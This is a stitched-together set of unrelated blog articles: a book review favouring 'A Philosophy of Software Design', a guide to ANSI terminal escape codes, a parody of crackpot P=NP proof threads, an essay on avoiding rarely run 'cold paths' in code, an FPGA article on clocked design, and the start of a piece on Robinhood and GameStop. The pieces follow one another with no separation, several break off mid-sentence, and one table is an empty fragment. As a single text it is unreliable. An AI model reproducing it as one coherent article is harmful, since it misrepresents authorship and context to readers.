<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <div><p>This review is largely in response to the article "<a href="https://qntm.org/clean">It's probably time to stop recommending Clean Code</a>", and the ensuing <a href="https://www.reddit.com/r/programming/comments/hhlvqq/its_probably_time_to_stop_recommending_clean_code/">Reddit discussion</a>.  A lot of really interesting points were brought up, but the big question that the author themself wasn't able to answer was: "What should we recommend instead?"</p>
<p>I believe the book we should be recommending is <em>A Philosophy of Software Design</em> by John Ousterhout.  In this post I want to spend a bit of time reviewing it and giving an overview of the contents, and then I want to explain why, in my opinion, it is such a good recommendation.</p>
<h2 id="an-empirical-philosophy-book">An Empirical Philosophy Book</h2>
<p>The elevator pitch of John Ousterhout's book <em>A Philosophy of Software Design</em> is fairly simple: he is a university professor (albeit one with almost two decades of experience in the "real world", also the inventor of Tcl, creator of RAFT, company founder amongst <a href="https://www.reddit.com/r/programming/comments/lb8zrn/an_alternative_to_clean_code_a_philosophy_of/glt3e4n/">other things</a>), who each year teaches students how to actually design software in a practical, hands-on course where the students are expected to design and modify "a substantial piece of software" in an iterative way, hopefully understanding more about the practice of software design each time around.</p>
<p>The book, then, is a synthesis of the pieces of wisdom that Ousterhout has himself learned from his own experiences, tempered and refined by the practical examples he has been able to draw from his students.  In this way, it has a (somewhat) scientific, research-based approach, where the author's assertions are backed up with examples from student projects that worked (or didn't).</p>
<p>At it's core, though, this is still philosophy - the book doesn't just list the things that worked well, and the things that worked poorly.  Instead, Ousterhout attempts in each chapter to divine broader truths that apply to software design in general.  There are no lists of what to do and what not to do, but instead principles to follow, red flags to be aware of, and warnings against taking anything too far.</p>
<h2 id="structure">Structure</h2>
<p>The book is split into a series of chapters, each of which generally explores a single principle.  These range from the very high level ("Working Code Isn't Enough", "Modules Should Be Deep") to the more practical questions ("Choosing Names").  The whole book is relatively short (about 180 pages), and many chapters flow together nicely, which means that it's quite easy to go from cover-to-cover, rather than approach the book as a reference manual.  That said, the final pages provide summaries of the design principles and red flags found in the book, making it easy to reference key parts of the book.</p>
<p>Within each chapter, Ousterhout generally starts by stating a problem or motivation that software engineers will face, and then defining a principle to solve this.  The rest of the chapter is then a discussion of the principle, the dangers of alternative approaches, the red flags that indicate that the principle needs to be applied (or in some cases avoided), and some notes about taking ideas too far.</p>
<p>The examples are often based on problems that Ousterhout has given his classes, which means that they generally feel meaty enough to be worth discussing.  An example of a text editor appears in Chapter 6, but is extended in Chapters 7, 8, 9, and 10 in different contexts.  Enough is omitted from most examples to make the point clear, but enough is kept in to give the feeling of real code.</p>
<h2 id="ousterhout-s-principles">Ousterhout's Principles</h2>
<p>The overriding theme throughout the book is that good code <em>looks</em> good.  Ousterhout thinks very much in terms of abstraction and interfaces - where "interfaces" refers to the contact points between different units of abstraction, rather than any similarly-named construct in any particular language.  Most of the book is dedicated to figuring out how to spot bad abstractions and rework them into good abstractions.</p>
<p>To a certain extent, this feels at odds with certain common mantras in software engineering circles today, where we encourage enough other to Keep It Simple, Stupid, and worry about premature abstractions.  <em>Philosophy</em> seems to worry less about the dangers of over-abstraction, and more concerned with how to make sure that the chosen abstraction is a good one.</p>
<p>This approach makes for a more positive experience than in many other programming circles - rather than being warned into a very conservative approach, Ousterhout encourages his readers to go out and make abstractions, but to be careful about designing the correct ones.</p>
<p>This isn't to say that the book isn't also cautionary - in the summary pages at the back, the list of red flags gets more page space than the list of principles, and throughout the book these red flags mark out moments when readers are given the go ahead to use these abstraction techniques.  There are also warnings about when a principle might be used too much.</p>
<h2 id="everyone-s-a-critic">Everyone's a Critic</h2>
<p>Beyond the mild danger of encouraging excess abstraction, the biggest issue in <em>Philosophy</em> is probably the missing parts - the topic of testing gets a single page in Chapter 19 (Software Trends), and ideas about effective use of a type system to avoid issues are largely ignored.  Ousterhout's principles will still apply in these areas, but it would be nice to see some more specific discussion of these areas.</p>
<h2 id="the-target-audience">The Target Audience</h2>
<p>It can be a bit unclear at times to whom Ousterhout writes.  A lot of the examples clearly relate to his students, and the projects that they come from have a somewhat academic feel - a text editor here, and an HTTP protocol parser there.  The code in the examples is generally object-oriented (Java and occasional C++), although it generally feels like it could be replaced with most imperative/OO languages without much of an effect.</p>
<p>The use of the phrase "software design" might make one think more of broader software architecture, but Ousterhout uses it more to describe the design of individual modules and functions <em>within</em> a program, rather than the broader architecture of the program itself (although he occasionally touches on that).</p>
<p>More functionally-minded people might think they can simply side-step a lot of the discussion here, in the same way that they can when discussing the Gang of Four's design patterns, but the principle "design errors out of existence" (Chapter 10) and its corollary "design special cases out of existence" should ring bells for people in this area who are also aware of the principle of making illegal states unrepresentable.</p>
<p>Ultimately, I think this book aims at a space that is slightly deeper than a lot of existing software literature.  Where books like <em>Design Patterns</em>, Fowler's <em>Refactoring</em>, and the aforementioned <em>Clean Code</em> are aimed at more traditional "enterprise" software development, <em>Philosophy</em> feels more widely applicable, albeit at the cost of being more abstract and difficult to apply.</p>
<p>In general, I think <em>Philosophy</em> is a good read if you are both (a) working with software regularly, and (b) conscious of the inherent maintenance cost in software, and aiming to minimise it.</p>
<h2 id="a-book-to-recommend">A Book to Recommend</h2>
<p>The original question I wanted to answer was what we, as software engineers, should recommend over books like <em>Clean Code</em>.  As I said, my answer to that question is <em>A Philosophy of Software Design</em>.</p>
<p>Software engineering (indeed, engineering in general) is not a science, insofar as there are no (or at least very few) exact answers.  Everything from the database you use to your choice of testing strategy will be dependent on the context of the software you're writing.  This means that the advice that we give to each other will probably be very context-specific.  In general, you probably shouldn't use a NoSQL database, but in a lot of specific contexts you probably should.</p>
<p>This isn't a problem if we don't run into these exceptional cases often, but engineering is all about exceptional cases - if there were no exceptional cases, we wouldn't need to write any new software, because our existing tools would do the job.  This is where books like <em>Philosophy</em> come in - rather than give situational advice, it attempts to define wider principles that the reader will then need to apply to different situations.</p>
<p>Take, for example, my favourite principle: "Modules should be deep" (explored in Chapter 4).  The idea is that an individual unit of abstraction should do a lot of work (i.e. be deep, and contain a lot of complexity), but it should have a relatively simple interface (i.e. be narrow).  Essentially, if you're going to abstract something, make sure your abstraction is deep.</p>
<p>Notice that this principle says nothing about functions, classes, lines, blocks, parameters, or anything specific to a single language or paradigm.  However, when we apply it, for example to the Java code Robert C. Martin talks about in <em>Clean Code</em>, we can derive some of his ideas from this principle.  Assuming a function is our unit of abstraction (for now, at least), the parameters are its interface, therefore we should reduce the number of parameters to the minimum necessary.</p>
<p>However, because our principle is more general, we can actually correct some of the mistakes Martin makes.  Martin talks about removing parameters by adding private fields to the class that the method belongs to.  When we think in terms of interfaces, we notice that this <em>hasn't decreased the interface at all</em> - we've lost a parameter, but we've gained a private field, and in the process made things harder for the consumer of our abstraction.</p>
<h2 id="teaching-principles-over-rules">Teaching Principles Over Rules</h2>
<p>When I recommend books, I generally hope that the other person will learn something from the book I have suggested.  If I were to recommend <em>Clean Code</em>, I would hope that the reader would learn something about how to write clean Java code, but I suspect they would mainly learn how to write code like Robert C. Martin - or more accurately, like someone copying Robert C. Martin's actions without always understanding why he's taking them.</p>
<p>I do not feel this way about <em>A Philosophy of Software Design</em>.  When I recommend it, I …</p></div></div></div>

<p><strong>See also: <a href="https://ankiweb.net/shared/info/1616925913">Flash cards (Anki deck) for memorization</a></strong></p>
<p>My team writes a lot of command line tools, and we like to assume that people aren’t using a literal <a href="https://en.wikipedia.org/wiki/VT100">VT100</a> (meaning: we liberally use colours, italics, and basically every other terminal feature available to us). This tends to result in strings in our code that look a little like this:</p>
<pre><code>"\x1b[A\r\x1b[K\x1b[1;32mopened \x1b[1;4;34m%s\x1b[0;1;32m in your browser.\x1b[0m\n"</code></pre>
<p>If you’re like most people, your face just melted, but it’s actually really simple. This page is a crash course in what all of these things mean, and how to learn to read and write them effectively.</p>
<h3 id="x1b"><code>\x1b</code></h3>
<p>ANSI escapes always start with <code>\x1b</code>, or <code>\e</code>, or <code>\033</code>. These are all the same thing: they’re just various ways of inserting the byte 27 into a string. If you look at an <a href="http://www.asciitable.com/">ASCII table</a>, <code>0x1b</code> is literally called <code>ESC</code>, and this is basically why.</p>
<h3 id="control-sequences">Control sequences</h3>
<p>The majority of these escape codes start with <code>\x1b[</code>. This pair of bytes is referred to as <code>CSI</code>, or “Control Sequence Introducer”. By and large, a control sequence looks like:</p>
<pre><code>0x1B + "[" + &lt;zero or more numbers, separated by ";"&gt; + &lt;a letter&gt;</code></pre>
<p>It’s helpful to think of it this way: the terminating letter is a function name, and the intervening numbers as function arguments, delimited by semicolons rather than the typical commas.</p>
<p>If you see <code>\x1b[0;1;34m</code>, you can read it like this:</p>
<pre><code>\x1b[  # call a function
0;1;34 # function arguments (0, 1, 34)
m      # function name</code></pre>
<p>In effect, this is <code>m(0, 1, 34)</code>. Similarly, <code>\x1b[A</code> is just <code>A()</code>.</p>
<h3 id="available-functions">Available functions</h3>
<p>So with that mental model—reading escape sequences as function invocations—here’s an abridged documentation of the “standard library”, as it were:</p>

<h3 id="sgr">SGR</h3>
<p>The SGR (“Select Graphics Rendition”) function (<code>m</code>) has a much more complex signature than the other functions. An—again, abridged—guide to SGR arguments:</p>

</tbody>
</table>
<p>Multiple SGR arguments can always be concatenated using another <code>;</code>, and they will be applied in the order they are encountered. It’s especially common to see <code>0;</code> before some other argument, in order to reset the state before applying our own.</p>
<h3 id="colour-palettes">Colour Palettes</h3>
<p>The basic colour palette has 8 entries:</p>
<ul>
<li>0: black</li>
<li>1: red</li>
<li>2: green</li>
<li>3: yellow</li>
<li>4: blue</li>
<li>5: magenta</li>
<li>6: cyan</li>
<li>7: white</li>
</ul>
<p>A useful way to help remember this, or at least to select colours for use, is that, with the exception of 0/black, the colours are ordered by usefulness, with highest first: red text is very useful for indicating failures, green is useful for indicating extreme success, yellow for warnings, and then blue, magenta, and cyan for progressively more obscure conditions or decoration.</p>
<p>0 and 7 are less useful for text because one or the other will generally look nearly-unreadable depending on whether the user has a light or a dark background.</p>
<p>Terminals will also have a “bright” version of this palette (activated using 90–97 / 100–107). These are the same (black/red/green/etc.) but generally noticeably brighter than their regular counterparts.</p>
<p>For practice, you might try to figure out how this string would display:</p>
<pre><code>\x1b[38;2;255;255;0mH\x1b[0;1;3;35me\x1b[95ml\x1b[42ml\x1b[0;41mo\x1b[0m</code></pre>
<h3 id="miscellany">Miscellany</h3>
<p>Another pair of useful escapes is <code>\x1b[?25h</code> and <code>\x1b[?25l</code>. These show and hide the cursor, respectively. Try not to think too hard about the syntax here: <code>?25</code> means something to do with the cursor and <code>h</code> and <code>l</code> stand for “high” and “low”: imagine a bit indicating whether the cursor should be visible. The “high” value (1) would indicate “show”; the “low” value (0) would indicate “hide”.</p>
<p>Show/hide is useful when you’re going to draw some stuff that’ll cause the cursor to jump around like crazy, for example, repainting a couple of the last few lines to update them with new content.</p>
<p>One other thing that we use frequently is <code>\r</code>, or Carriage Return, which is functionally similar or identical to <code>\x1b[1G</code>. It just moves the cursor to the start of the line.</p>
<h3 id="summary">Summary</h3>
<p>That was a lot of information, but that’s essentially everything you need to know in order to competently read and write ANSI escape codes in a terminal.</p>

inspired by <a href="http://www.pandagon.net/mtarchives/001749.html">pandagon</a>: a meta-proof of P=/!=NP, coming to a <a href="http://groups.google.com/groups?hl=en&amp;lr=&amp;ie=UTF-8&amp;group=comp.theory">newsgroup near you</a>:
</p><p>
P: I would like to announce my proof of P=/!=NP. The proof is very short and demonstrates how to solve/not solve SAT in polynomial time. You may find a write up of the proof <a href="http://">here</a>.
</p><p>
|-- V: I started reading your proof and when you claim 'foobar' do you mean 'foobar' or 'phishbang' ? 
<br>|----P: I meant 'phishbang'. Thanks for pointing that out. An updated version is <a href="http://">here.</a>
<br>|------V: Well if you meant 'phishbang' then statement "in this step we assume the feefum" is incorrect.
<br>|--------P: No no, you don't understand. I can assume feefum because my algorithm has a glemish.
<br>|-----------V: It has a glemish ? !! But having a glemish doesn't imply anything. All algorithms have glemishes !!
<br>|----V': Yes, and in fact in the 3rd step of argument 4, your glemish contradicts the first propum. 
<br>|--V'': I think you need to understand some basic facts about complicity theory before you can go further. Here is a book to read.
<br>|----P: My proof is quite clear, and I don't see why I have to explain it to you if you don't understand. I have spent a long time on this.
<br>|------V': Um, this is a famous problem, and there are many false proofs, and so you do have to convince us that the argument using glemishes can   actually work.
<br>|--------P: But what is wrong in my proof ? I don't see any problems with it, and if you can't point one out, how can you say it is wrong.
<br>|----------V'''': I don't have to read the entire proof: glemished algorithms are well known not to work.
<br>|------------V'''''': Check out this reference by </p><well known="" person=""> to see why.
<br>P: &lt;silence&gt;
<br>|--P: &lt;answering earlier post&gt;. This is what I mean by a glemish. it is really a flemish, not a glemish, which answers your objection.
<br>|----P': Keep up the good work P. I tried publishing my result, and these people savaged my proof without even trying to identify a problem. All great mathematical progress has come from amateurs like us. See this <a href="http://">link</a> of all the theorems proved by non-experts.
<br>|------V': Oh jeez, not P' again. I thought we had established that your proof was wrong.
<br>|--------P': no you didn't: in fact I have a new version that explains the proof in such simple language even dumb&amp;%&amp;%s like you can get it.
<br>|------P: Thanks P', I understand that there will be resistance from the community since I have proved what they thought to be so hard. 
<br>|--V': P, I'm trying to understand your proof, with the flemishes, and it seems that maybe there is a problem in step 517 with the brouhaha technique.
<br>P: &lt;silence&gt;
<br>|----P: V', thanks for pointing out that mistake. you are right. Instead of a brouhaha technique I need a slushpit. The details are complicated, so I will fix it and post a corrected version of the proof shortly. Thanks to all those who gave me constructive advice. I am glad that at least some of you have an open mind to accept new ideas. 
<hr>
<p>
This was prompted by the latest P=NP fiasco on comp.theory. I can only express my amazement and wonder at the few tireless souls (and they seem to be the same ones) who patiently try to address each new crackpot proof that comes down the pipe.

	<p><em>Faced with yet another crisis caused by a bug hidden in a cold path, I found
myself Googling for a quick link to Slack out to the engineering team about cold paths.
Unfortunately, I can’t find a focused write-up; and so here I am writing this.</em></p>

<p>A <strong>cold path</strong> is a path through the code or situation that rarely happens. By contrast,
<strong>hot paths</strong>
happen frequently. You don’t find bugs in hot paths. By nature, bugs are found
in places that you didn’t think to look. Bugs are always in cold paths — every bug is
found in a path colder than all the paths you tested.</p>

<p>Here are some real world “cold paths” with big consequences:</p>

<ul>
  <li><a href="https://blog.thousandeyes.com/impacts-expired-tls-certificate/">An outage caused by an expired TLS certificate</a></li>
  <li><a href="https://en.wikipedia.org/wiki/Year_2000_problem">Y2K</a></li>
</ul>

<p>Rare events are <a href="https://www.amazon.com/Black-Swan-Improbable-Robustness-Fragility/dp/081297381X">hard to predict</a>. That’s just the nature of them. As engineers,
I belive it’s our responsibility to do our best to try harder and get better at planning for
these rare bugs. Is that it? Try harder?</p>

<p>Better: Don’t have cold paths</p>


<p>I watched one of Gil Tene’s many amazing talks on Azul’s C4 garbage collector (not <a href="https://www.infoq.com/presentations/Java-GC-Azul-C4/">this talk</a>,
but similar) where he claimed that normally it takes 10 years to harden a garbage
collector. Azul didn’t have 10 years to produce a viable business, so they avoided almost all
cold paths in the collector and they were able to harden it in 4 years (I never tried verifying
this claim).</p>

<p>For a garbage collector, this means things like offering fewer options, or having a simpler
model to avoid cold paths around promoting objects between generations. For your app it will
mean something different.</p>

<p>You can <strong>test less</strong> to achieve high quality by <strong>reducing the size</strong> of your application. 
Less edge cases is equivalent to less testing surface area, which implies less testing work
and fewer missed test cases. There’s something to be said for avoiding config options and
making solutions less generic.</p>


<p>While I worked at AWS I had this beaten into my skull, but thankfully they’ve published 
guidence an excellent piece titled <a href="https://aws.amazon.com/builders-library/avoiding-fallback-in-distributed-systems/?did=ba_card&amp;trk=ba_card">“avoiding fallback in distributed systems”</a>. The 
hope is that, when system 1 fails you would like to automatically fallback to system 2.</p>

<p>For example, let’s say we have a process that sends logs to another service. For the hot 
path, we send logs directly via an HTTP request. But if the log service fails (e.g. 
overloaded, maintenence, etc.) we fallback by writing to a file and have a secondary process 
send those logs to the service when it comes back.</p>

<ul>
  <li>System 1: directly send logs to server</li>
  <li>System 2: send asynchronously via file append</li>
</ul>

<p>If system 2 is more reliable than system 1, then why don’t we always choose system 2? 
Always write to the file and ship logs asynchronously rather than send directly to the 
server. This is surprisingly strong logic that isn’t considered often enough. More often,
by asking the question you end up finding a way to make system 1 more robust.</p>

<p>In cases where fallback can’t be avoided they suggest always exercising the fallback. 
For example, on every request, randomly decide to use either system 1 or system 2, 
thereby ensuring that the cold path isn’t cold because both are exercised on the hot path,
at least sometimes.</p>


<p>In <a href="https://danluu.com/deconstruct-files/">“files are fraught with problems”</a>, Dan Luu demonstrates that it’s unexpectedly
difficult to write a file to disk correctly. Juggling issues like handling random power loss or 
strange ext4 behavior becomes a full-time job. It’s a lot to keep in your head, just to 
write a file.</p>

<p>Is it better to:</p>

<ol>
  <li>Ignore the cold paths and hope for the best</li>
  <li>Correctly implement &amp; test each file write event and ship late</li>
  <li>Use a system that does it correctly for you, like MySQL or SQLite</li>
</ol>

<p>Choice #3 delegates the testing of all those pesky cold paths to a 3rd party. 
Therefore, #3 is always the best choice, unless your company is in the file writing 
business (e.g. you’re AWS and working on DynamoDB or S3).</p>

<p>Alternnate take on the same idea: <a href="https://mcfunley.com/choose-boring-technology">Choose boring technology</a></p>


<p>The practice of avoiding cold paths is often presented as “simple code”. Unfortunately, “simple”
has such wildly varying meanings that it’s often antagonistic to use it outside a
mathematical setting. I’ve found that centering conversations around “avoiding cold paths”
gives more clarity on how to proceed.</p>

<p>In system design, the conversation about what is “simple” is even tougher due to the 
amorphous nature of it. The principle of “avoiding cold paths” can be extended to mean,
“delegating cold paths” to a trusted third party, like an open source project or a cloud
provider. An earnest discussion about your capacity for testing might be
appropriate. It lets you disengage from “building cool stuff” and instead view it as
“testing burden I’d rather not have”.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
    <p>If you have a software background and you want to pick up digital design,
then one of the first things you need to learn about early on is the concept
of the clock.  To many software engineers turned beginning
<a href="https://en.wikipedia.org/wiki/Hardware_description_language">Hardware Description Language
(HDL)</a>
designers, the concept of a clock is an annoyance.  Without using a
clock, they can turn
<a href="https://en.wikipedia.org/wiki/Hardware_description_language">HDL</a>
into a programming language–with $display’s, <code>if</code>’s,
and <code>for</code> loops like any other programming language.  Yet the clock that these
beginning designers ignore is often the most fundamental part of any digital
design.</p>

<p>This difficulty is never more present then when reviewing some of the first
designs that beginning
<a href="https://en.wikipedia.org/wiki/Hardware_description_language">HDL</a>
developers produce.  I’ve now talked with several of these individuals who
have posted questions on the forums I participate within.  When I’ve then
drilled down into what they are doing, I’ve had to cringe at what I’ve found.</p>

<p>As an example, one student came to me struggling to understand why no one
on-line seemed to think much of his
<a href="https://en.wikipedia.org/wiki/Advanced_Encryption_Standard">Advanced Encryption Standard (AES)</a>
<a href="https://en.wikipedia.org/wiki/Hardware_description_language">HDL</a>
implementation.
I’ll spare him the embarrassment of being named, or of linking to his project.
Instead, I’m just going to call him a <em>student</em>.  (No, <a href="https://zipcpu.com/about">I’m not a
professor</a>.)
This “student” had created a Verilog design to do not one round of
<a href="https://en.wikipedia.org/wiki/Advanced_Encryption_Standard">AES</a>
encryption, but <em>every round</em>, <em>all in combinatorial logic with no clocks</em> in
between.  I can’t remember if he was doing
<a href="https://en.wikipedia.org/wiki/Advanced_Encryption_Standard">AES</a>-128,
<a href="https://en.wikipedia.org/wiki/Advanced_Encryption_Standard">AES</a>-192, or
<a href="https://en.wikipedia.org/wiki/Advanced_Encryption_Standard">AES</a>-256,
but <a href="https://en.wikipedia.org/wiki/Advanced_Encryption_Standard">AES</a>
requires between 10 and 14 rounds.  As I recall, his encryption engine
worked perfectly in the simulator, yet it only used one clock to encrypt or
decrypt his data.  He was proud of his work, but couldn’t understand why
those who looked at it told him he was thinking like a software engineer,
and not like a hardware designer.</p>

<table><caption>Fig 1: Software is Sequential</caption><tbody><tr><td><img src="https://zipcpu.com/img/sw-is-serial.svg" alt="Software runs serially" width="128"></td></tr></tbody></table>
<p>Indeed, I’ve now had the opportunity to counsel many of these software
engineers, new to
<a href="https://en.wikipedia.org/wiki/Hardware_description_language">HDL</a>,
like this “student”.  Many of them like to treat
<a href="https://en.wikipedia.org/wiki/Hardware_description_language">HDL</a> like
just another <em>software programming</em> language.  Having programmed before, they
go and look for the basics in any software programming language: how to
declare variables, how to make an if statement, a case statement, how to write
loops, etc.  They then write their code like a computer program–where
everything needs to run sequentially (Fig 1), yet completely ignoring the
reality of digital design which is that everything runs in parallel.</p>

<p>Sometimes these programmers will find a simulator, such as
<a href="https://www.veripool.org/wiki/verilator">Verilator</a>,
<a href="http://iverilog.icarus.com/">iverilog</a>,
or the
<a href="https://www.edaplayground.com/">EDA playground</a>.
They’ll then use a bunch of <code>$display</code> commands in their logic, treat them like
sequential “printf”s and use them to get their code to work–<em>without using
a clock</em>.  Their design then “runs” in the simulator using combinatorial logic
alone.</p>

<p>These students then describe their designs to me, and explain to me that their
design “works without a clock”.</p>

<p>Say what?</p>

<p>The reality is that no digital logic design can work “without a clock”.
There is always some physical process creating the
inputs.  These inputs must all be valid at some start time–this time forms the
first clock “tick” in their design.  Likewise, the outputs are then required
from those inputs some time later.  The time when all the outputs are
valid given for a given set of inputs forms the next “clock” in a “clockless”
design.  Perhaps the first clock “tick” is when the set the last switch on
their board is adjusted and the last clock “tick” is when their eye reads the
result.  It doesn’t matter: there is a clock.</p>

<p>The result is that someone who claims that their design “has no clock” is
either stating that he is using the simulator in an unrealistic fashion, or
that the design has an external clock setting the inputs and reading the
outputs–which is another way of saying that the design really <em>does</em> have
a clock.</p>

<p>If you find yourself struggling to understand the necessity of having a clock
when working in digital logic, or if you know someone who might be struggling
with this concept, then this post is for you.</p>

<p>Let’s spend a moment or two discussing the clock, and why it is so important
to build and design your logic around a clock.</p>

<h2 id="lesson-1-hardware-design-is-parallel-design">Lesson #1: Hardware design is parallel design</h2>

<p>The first and perhaps most difficult part of learning hardware design is
to learn that all hardware design is parallel design.  Things don’t take
place serially, as in one instruction after another (Fig 1), like they do in a
<a href="https://en.wikipedia.org/wiki/Central_processing_unit">computer</a>.
Instead, everything happens at once, as in Fig 2.</p>

<table><caption>Fig 2: Hardware logic runs in Parallel</caption><tbody><tr><td><img src="https://zipcpu.com/img/hw-is-parallel.svg" alt="Hardware runs in parallel" width="780"></td></tr></tbody></table>

<p>This changes a <em>lot</em> of things.</p>

<table><caption>Fig 3: A software loop</caption><tbody><tr><td><img src="https://zipcpu.com/img/sw-loop.svg" alt="Figure of a software loop" width="200"></td></tr></tbody></table>

<p>The first thing that changes needs to be the developer.  You need to <a href="https://zipcpu.com/blog/2017/08/21/rules-for-newbies.html">learn to
<em>think</em> in
parallel</a>.</p>

<p>Perhaps a good example of this difference would be a hardware loop.</p>

<p>In software, a loop consists of a series of
instructions, as Fig 3 illustrates.  These instructions create a set of
initial conditions.  Logic is then performed within the loop.  Then a loop
variable is used to make and define this logic, and it is often incremented
each time through the loop.  Until the
loop variable reaches the termination condition, the
<a href="https://en.wikipedia.org/wiki/Central_processing_unit">CPU</a>
continues to repeat
the instructions and logic within the loop.  The more times the loop runs,
the longer it takes to run the program.</p>

<p><a href="https://en.wikipedia.org/wiki/Hardware_description_language">HDL</a>
based hardware loops are not like this at all.  Instead, the
<a href="https://en.wikipedia.org/wiki/Hardware_description_language">HDL</a>
synthesis
tool uses the loop description to make several copies of the logic all
running in parallel.  The logic used to create the loop, such as the index,
to increment that index, to check the index against the final condition, etc.,
doesn’t need to be synthesized–so it is usually removed.  Further, since
the synthesis tool is creating physical wires and logic blocks, the number
of times through the loop cannot change after synthesis time.  After that
time, the amount of hardware is fixed and can no longer be changed.</p>

<p>The structure that results, shown in Fig 4 below, is <em>very</em> different from
the structure of a software loop in Fig 3 above.</p>

<table><caption>Fig 4: An HDL generated loop</caption><tbody><tr><td><img src="https://zipcpu.com/img/hw-loop.svg" alt="Figure of an HDL generated loop" width="780"></td></tr></tbody></table>

<p>This has several consequences.  For example, loop iterations can’t necessarily
depend upon the output of prior loop iterations like they could in software.
As a result, it’s hard to run a loop of logic across all of the data in a set
have an answer in the next clock.</p>

<p>But … now we’ve come back to the concept of the clock again.</p>

<p>The clock is central to any
<a href="https://en.wikipedia.org/wiki/Field-programmable_gate_array">FPGA</a>
design.  Everything revolves around it.
Indeed, I would argue that all of your logic development should <em>start</em> with
the clock.  It’s not an afterthought, but rather the clock forms the
structure of how you think about digital design in the first place.</p>

<h2 id="why-the-clock-is-important">Why the clock is important</h2>

<p>Step one is to understand that everything within a digital logic design takes
time to do in hardware.  Not only that, but
different operations take different amounts of time.  Traveling from one
part of the chip to another also takes time.</p>

<p>Perhaps the way to visualize this is with a chart.  Let’s place the
inputs to our algorithm on the top, the logic in the middle, and the outputs
on the bottom.  Time, as an axis, will run from top to bottom, from one clock
to the next.  The result of this visualization might look something like
Fig 5, below.</p>

<table><caption>Fig 5: Logic takes time, three operations</caption><tbody><tr><td><img src="https://zipcpu.com/img/clk-poor-design.svg" alt="Figure showing several logic operations, and their impact on the clock rate" width="780"></td></tr></tbody></table>

<p>Fig 5 shows several different operations: an addition, a multiply, and several
rounds of
<a href="https://en.wikipedia.org/wiki/Advanced_Encryption_Standard">AES</a>–although
for discussion purposes it could be several rounds of any algorithm.
I’ve used the size of the operation boxes, in the vertical direction, to
indicate notionally how much time each operation might require.  Further,
operations that depend upon other operations stack up.  Hence, if you want
to do many rounds of
<a href="https://en.wikipedia.org/wiki/Advanced_Encryption_Standard">AES</a> within
one clock, you’ll need to know that the second round cannot begin until
the first is complete.  Fitting this logic in, therefore, will increase the
amount of time between clock ticks and slow down your overall clock rate.</p>

<p>Now let’s look at the pink boxes.</p>

<p>The pink boxes represent the wasted capacity in your hardware
circuit–times when you might have been able to do something,
but since you had to wait for the clock, or perhaps wait for your inputs
to be processed first, you couldn’t do anything.  For example, in our notional
diagram above the multiply doesn’t take as long as one round of
<a href="https://en.wikipedia.org/wiki/Advanced_Encryption_Standard">AES</a>,
neither does the addition.  However, you can’t do anything with the results
of those two operations while the
<a href="https://en.wikipedia.org/wiki/Advanced_Encryption_Standard">AES</a>
calculations are taking place since those operations need to wait for
the next clock to get their next inputs.  This is what the “pink” boxes
represent in Fig 5: idle circuitry.  Further, because all of the
<a href="https://en.wikipedia.org/wiki/Advanced_Encryption_Standard">AES</a>
rounds are pushing the next clock into the distance, there’s a lot of
idle circuitry presented in Fig 5.  This design, therefore, will not run as
fast as the hardware would allow.</p>

<p>If all we did was pipeline the
<a href="https://en.wikipedia.org/wiki/Advanced_Encryption_Standard">AES</a>
algorithm, so that one round could be calculated on every clock, we could
then get the entire design to run faster with less wasted capacity.</p>

<p>Fig 6 shows this idea.</p>

<table><caption>Fig 6: Breaking up the operations speeds up the clock</caption><tbody><tr><td><img src="https://zipcpu.com/img/clk-aes-better.svg" alt="Figure: several operations, with immediate results between each" width="780"></td></tr></tbody></table>

<p>As a result of breaking our operation up into smaller operations, each of
which could be accomplished between clock ticks, our design now has much
less wasted capacity.  Even better, instead of encrypting only one block
of data at a time, we can pipeline the encryption algorithm.  The resulting
logic won’t encrypt a single block any faster than Fig 5 above, but if you
can keep the pipeline full you should be able to increase your
<a href="https://en.wikipedia.org/wiki/Advanced_Encryption_Standard">AES</a>
encryption throughput by somewhere between 10-14x faster.</p>

<p>This is therefore a better design.</p>

<p>Can we do better?  Indeed we could!  If you are familiar with
<a href="https://en.wikipedia.org/wiki/Advanced_Encryption_Standard">AES</a>,
then you know that each round of
<a href="https://en.wikipedia.org/wiki/Advanced_Encryption_Standard">AES</a>,
has discrete steps within it.  These
can be broken up, allowing us to increase our clock speed until the
<a href="https://en.wikipedia.org/wiki/Advanced_Encryption_Standard">AES</a>
round logic takes less time than the multiply.  This will increase the number
of adds and multiplies you can do, as well as micro-pipelining your
encryption engine so that you can run even more data through it on a per
clock basis.</p>

<p>Not bad.</p>

<p>Last week’s GameStop (GME) speculative frenzy stirred a motley crew  of Redditors, politicians, and venture capitalists, each using the volatility to push their preferred narratives. <em>Evil hedge funds are <a href="https://www.wsj.com/articles/citadel-point72-to-invest-2-75-billion-into-melvin-capital-management-11611604340">propping up their buddies</a> and astroturfing misinformation. Market makers are evil for <a href="https://www.wsj.com/articles/gamestop-frenzy-puts-spotlight-on-trading-giant-citadel-securities-11612089000">profiting off retail order flow</a>. Robinhood has forsaken its namesake and is in cahoots with the aforementioned parties.</em> There are plenty of villains in this story, or none at all, depending on your view of the financial industry.</p>

<p>The real answer to why Robinhood restricted trading on GME turned out to be <a href="https://www.nytimes.com/live/2021/02/01/business/us-economy-coronavirus#robinhood-needed-3-billion-to-cover-risky-trades-its-chief-told-elon-musk">far more mundane</a>. To recap, settlement of stock trades takes multiple days, and in the meantime, the clearinghouses that facilitate trades for brokers require that some collateral be placed to account for risk that the buyer or seller does not fulfill their side of the trade. Since this risk increases with stock volatility, clearinghouses demanded $3 billion collateral from Robinhood to account for their users holding GME, a meme stock that was routinely seeing +/- 50% swings but threatened to crash to earth at any moment. Robinhood was forced to deal with the imminent liquidity challenge by raising emergency funding. In the meantime, to manage risk, they placed limits on purchasing GME shares. So goes the story recounted by Robinhood CEO Vlad Tenev (or as Elon Musk called him, “<a href="https://www.marketwatch.com/story/tesla-ceo-elon-musk-calls-robinhood-ceo-vlad-the-stock-impaler-and-grills-him-over-the-gamestop-saga-11612180184">Vlad the stock impaler</a>”).</p>

